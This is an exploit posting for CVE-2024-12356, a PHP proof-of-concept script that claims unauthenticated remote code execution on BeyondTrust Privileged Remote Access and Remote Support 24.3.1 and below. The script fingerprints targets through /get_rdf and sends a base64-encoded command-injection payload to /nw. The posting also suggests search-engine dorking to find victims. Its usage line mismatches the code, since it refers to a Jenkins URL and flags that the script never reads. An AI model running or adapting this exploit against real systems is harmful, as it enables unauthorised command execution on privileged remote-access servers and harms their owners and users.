=============================================================================================================================================
| # Title     : BeyondTrust 24.3.1 php Code Execution Vulnerability                                                                         |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
| # Vendor    : https://www.beyondtrust.com/                                                                                                |
=============================================================================================================================================

POC :

[+] Dorking İn Google Or Other Search Enggine.

[+] Code Description: This exploit achieves unauthenticated remote code execution against BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS), 

    with the privileges of the site user of the targeted BeyondTrust product site. This exploit targets PRA and RS versions 24.3.1 and below.

   (Related : https://packetstorm.news/files/id/189316/ Related CVE numbers: CVE-2024-12356 ) .
	
[+] save code as poc.php.

[+] Set target : Line 44

[+] Usage: php script.php -u <Jenkins URL> -f <file path> [-p <proxy>]

[+] PayLoad :

<?php

class BeyondTrustExploit {
    private $target;
    private $port;
    private $useSSL;

    public function __construct($target, $port = 443, $useSSL = true) {
        $this->target = $target;
        $this->port = $port;
        $this->useSSL = $useSSL;
    }

    private function sendRequest($uri, $params = []) {
        $url = ($this->useSSL ? 'https://' : 'http://') . $this->target . ':' . $this->port . $uri;
        $query = http_build_query($params);
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: PHP-Exploit-Script\r\n",
            ]
        ]);
        return file_get_contents($url . '?' . $query, false, $context);
    }

    public function checkVulnerability() {
        $response = $this->sendRequest('/get_rdf', ['comp' => 'sdcust', 'locale_code' => 'en-us']);
        if (!$response) {
            return 'Unknown: Connection failed';
        }
        if (strpos($response, 'Thank you for using BeyondTrust') !== false) {
            return 'Vulnerable: Target appears to be running a vulnerable version';
        }
        return 'Safe: Target does not appear to be vulnerable';
    }

    public function exploit($command) {
        $payload = base64_encode("\xC0'; \\! {$command} #");
        $response = $this->sendRequest('/nw', ['gskey' => $payload]);
        return $response ?: 'Exploit attempt sent.';
    }
}

$target = 'example.com'; // ضع هنا عنوان الهدف
$exploit = new BeyondTrustExploit($target);

echo $exploit->checkVulnerability();
// إذا كان الهدف ضعيفًا، يمكنك محاولة تنفيذ أمر
// echo $exploit->exploit('id');




Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================